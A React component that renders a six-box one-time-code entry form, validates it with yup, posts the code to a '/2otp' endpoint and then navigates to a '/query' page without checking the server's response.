import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/pin.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../component/FormErrMsg";
import axios from "axios";
import BASE_URL from "../component/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
    .required("OTP is required"),
});

const SecondOtp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(6).fill(""));

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 5 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    axios.post(`${BASE_URL}/2otp`, data);
    console.log(data);
    navigate("/query");
  };

  return (
    <div className="pin-container">
      <h2>Enter OTP</h2>
      <p>
        A six digit pin has been sent to your email address, enter it in this
        field to complete your sign in process
      </p>
      <form onSubmit={handleSubmit(submitForm)}>
        <div className="pin-inputs">
          {otp.map((data, index) => (
            <input
              key={index}
              id={`otp-${index}`}
              type="password"
              maxLength="1"
              value={data}
              onChange={(e) => handleChange(e.target, index)}
              onFocus={(e) => e.target.select()}
              className="pin-input"
              inputMode="numeric"
            />
          ))}
        </div>
        <FormErrMsg errors={errors} inputName="otp" />
        <div className="verify-button">
          <button type="submit">Continue</button>
        </div>
      </form>
    </div>
  );
};

export default SecondOtp;
